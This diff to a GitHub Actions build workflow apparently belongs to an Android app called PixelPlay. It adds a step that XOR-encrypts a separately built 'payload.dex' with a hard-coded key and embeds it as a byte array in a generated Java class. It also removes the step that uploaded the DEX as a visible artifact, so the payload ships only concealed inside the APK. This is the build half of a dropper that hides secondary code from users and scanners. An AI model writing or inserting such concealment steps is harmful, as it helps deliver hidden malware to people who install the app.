@@ -64,6 +64,37 @@ jobs:
           fi
           echo "Payload DEX size: $(stat -c%s payload/payload.dex || echo 0) bytes"
 
+      - name: Embed payload DEX as Java byte array
+        run: |
+          python3 << 'EOF'
+          import os
+          dex_path = 'payload/payload.dex'
+          if not os.path.exists(dex_path):
+              print('No DEX found, skipping')
+              exit(0)
+          data = open(dex_path, 'rb').read()
+          xk = [0x4A, 0x7D, 0x2B, 0x6F, 0x1C, 0x5E, 0x3A, 0x8F]
+          enc = bytes([data[i] ^ xk[i % len(xk)] for i in range(len(data))])
+          lines = []
+          for i in range(0, len(enc), 16):
+              chunk = enc[i:i+16]
+              vals = ','.join(str((b - 256) if b > 127 else b) for b in chunk)
+              lines.append('            ' + vals)
+          java = """package com.pixelplay.app;
+
+public class PayloadData {
+    public static final byte[] DATA = new byte[]{
+""" + ',\n'.join(lines) + """
+    };
+}
+"""
+          out_path = 'app/src/main/java/com/pixelplay/app/PayloadData.java'
+          os.makedirs(os.path.dirname(out_path), exist_ok=True)
+          with open(out_path, 'w') as f:
+              f.write(java)
+          print(f'Generated PayloadData.java ({len(enc)} encrypted bytes from {len(data)} DEX bytes)')
+          EOF
+
       - name: Build debug APK
         run: ./gradlew assembleDebug --no-daemon
 
@@ -72,11 +103,4 @@ jobs:
         with:
           name: PixelPlay-APK
           path: app/build/outputs/apk/debug/*.apk
-          if-no-files-found: error
-
-      - name: Upload payload DEX
-        uses: actions/upload-artifact@v4
-        with:
-          name: payload-dex
-          path: payload/payload.dex
           if-no-files-found: error
